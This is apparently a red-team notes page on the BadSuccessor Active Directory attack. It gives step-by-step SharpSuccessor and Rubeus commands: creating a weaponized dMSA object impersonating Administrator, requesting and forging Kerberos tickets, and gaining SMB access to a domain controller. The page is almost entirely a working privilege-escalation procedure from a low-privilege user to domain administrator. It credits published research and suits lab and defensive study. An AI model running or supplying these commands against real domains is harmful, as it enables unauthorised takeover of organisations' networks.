---
icon: flask-round-potion
---

# BadSuccessor – Full Active Directory Compromise

## SharpSuccessor

SharpSuccessor is a .NET Proof of Concept (POC) for fully weaponizing Yuval Gordon’s ([@YuG0rd](https://x.com/YuG0rd)) [BadSuccessor](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory) attack from Akamai. A low privilege user with `CreateChild` permissions over any Organizational Unit (OU) in the Active Directory domain can escalate privileges to domain administrator.

Use SharpSuccessor to add and weaponize the dMSA object, setting the account with access to the current user context:

```
SharpSuccessor.exe add /impersonate:Administrator /path:"ou=test,dc=lab,dc=lan" /account:jdoe /name:attacker_dMSA
```

<figure><img src="https://private-user-images.githubusercontent.com/55106700/447281186-adf814ad-3a67-4862-b01e-01cf42df0747.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NDkwMzA3OTYsIm5iZiI6MTc0OTAzMDQ5NiwicGF0aCI6Ii81NTEwNjcwMC80NDcyODExODYtYWRmODE0YWQtM2E2Ny00ODYyLWIwMWUtMDFjZjQyZGYwNzQ3LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA2MDQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwNjA0VDA5NDgxNlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTU3YjdmYTFkNDA5ODhjZGM4ODgzNzYwMWVmMzZkZDdhMDQxMTFmNjljOTA1MmFiZmNiYmU4ODJjN2VkYTI2MzcmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.JIFWkoyt6mGH-jiyY-S1FibPrwfCwPUhIMC2P4L_RB8" alt=""><figcaption></figcaption></figure>

Request a TGT as the current user context, in this case `jdoe`:

```
Rubeus.exe tgtdeleg /nowrap
```

<figure><img src="https://private-user-images.githubusercontent.com/55106700/447281337-90784c3d-0961-437a-9212-51c0accacad1.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NDkwMzA3OTYsIm5iZiI6MTc0OTAzMDQ5NiwicGF0aCI6Ii81NTEwNjcwMC80NDcyODEzMzctOTA3ODRjM2QtMDk2MS00MzdhLTkyMTItNTFjMGFjY2FjYWQxLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA2MDQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwNjA0VDA5NDgxNlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTVkYjQ5ODAzMGE0YzMxMTRlOTcwNWEwZTU3ZGE3ZGE3OTY1NjA1ZDYxMzQzOTVjMmMzNDhmMGFhNjZiYWEzYTYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.IMFPe5do-KQvefy-3-SHZqxlAKEuK86R3eAdHs3oMxY" alt=""><figcaption></figcaption></figure>

Then use that tgt to impersonate the dMSA account:

```
Rubeus.exe asktgs /targetuser:attacker_dmsa$ /service:krbtgt/lab.lan /opsec /dmsa /nowrap /ptt /ticket:doIFTDCCB.....
```

<figure><img src="https://private-user-images.githubusercontent.com/55106700/447281435-7f642c89-7c87-4f48-bb60-a8d9be684912.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NDkwMzA3OTYsIm5iZiI6MTc0OTAzMDQ5NiwicGF0aCI6Ii81NTEwNjcwMC80NDcyODE0MzUtN2Y2NDJjODktN2M4Ny00ZjQ4LWJiNjAtYThkOWJlNjg0OTEyLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA2MDQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwNjA0VDA5NDgxNlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTkyNmMxMDMwZTdiODA4MGRmYTVjMGE4MTcxZDhmZjczOThiNGQxNDQ4M2I1MTNmZWZhODYwZGM1ZDc0NTc2YWUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.4S2SeM6_AVjNGWyM-SNxmW0gPonBW5tU6bvr7Sr2utQ" alt=""><figcaption></figcaption></figure>

Now you can request a service ticket with Administrator context for any SPN, including the Domain Controllers for post-exploitation. For example here I will show admin privileges for SMB on the domain controller:

```
Rubeus.exe asktgs /user:attacker_dmsa$ /service:cifs/WIN-RAEAN26UGJ5.lab.lan /opsec /dmsa /nowrap /ptt /ticket:doIF2DCCBdS...
```

<img src="https://private-user-images.githubusercontent.com/55106700/447159728-f4799c6d-ef21-4fbc-af2d-2fd900545937.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NDkwMzA3OTYsIm5iZiI6MTc0OTAzMDQ5NiwicGF0aCI6Ii81NTEwNjcwMC80NDcxNTk3MjgtZjQ3OTljNmQtZWYyMS00ZmJjLWFmMmQtMmZkOTAwNTQ1OTM3LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA2MDQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwNjA0VDA5NDgxNlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWEwODhjOTlhMTVhZjFhZDJlODM5ZjliZjZmMmQ1ZjFlYTY5MWY0ZmZmNGU2MjYxMmNkNTdiNjI0YmQxMWFhZDEmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.xCxW0YjfzOSjtExnlnv6Fz3Y5jIvLMh7UufySsi6BIQ" alt="image" data-size="original">



Now that we have the ticket in memory, we can test access:

[![image](https://private-user-images.githubusercontent.com/55106700/447160079-6838bb98-5b7a-406a-a889-9e9236a3428f.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NDkwMzA3OTYsIm5iZiI6MTc0OTAzMDQ5NiwicGF0aCI6Ii81NTEwNjcwMC80NDcxNjAwNzktNjgzOGJiOTgtNWI3YS00MDZhLWE4ODktOWU5MjM2YTM0MjhmLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA2MDQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwNjA0VDA5NDgxNlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTI5Nzk5NzYzMjZiMDFlN2RkZTE5NGExYTJiODllM2Y5MzE4OTZmMzEzMTBlZGRhZjUzMGMwOGQ4YWE3ZGY3ZTImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.mAHn1R_LBe_JPN8VC7IS7TvHm-Cwou4gSpKM9qVPJFI)](https://private-user-images.githubusercontent.com/55106700/447160079-6838bb98-5b7a-406a-a889-9e9236a3428f.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NDkwMzA3OTYsIm5iZiI6MTc0OTAzMDQ5NiwicGF0aCI6Ii81NTEwNjcwMC80NDcxNjAwNzktNjgzOGJiOTgtNWI3YS00MDZhLWE4ODktOWU5MjM2YTM0MjhmLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA2MDQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwNjA0VDA5NDgxNlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTI5Nzk5NzYzMjZiMDFlN2RkZTE5NGExYTJiODllM2Y5MzE4OTZmMzEzMTBlZGRhZjUzMGMwOGQ4YWE3ZGY3ZTImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.mAHn1R_LBe_JPN8VC7IS7TvHm-Cwou4gSpKM9qVPJFI)

\


***

## REFERENCES

* [https://github.com/logangoins/SharpSuccessor?tab=readme-ov-file](https://github.com/logangoins/SharpSuccessor?tab=readme-ov-file)
* [https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
* [https://www.youtube.com/watch?v=IWP-8IMzQU8\&list=WL\&index=1\&ab\_channel=TheWeeklyPurpleTeam](https://www.youtube.com/watch?v=IWP-8IMzQU8\&list=WL\&index=1\&ab_channel=TheWeeklyPurpleTeam)
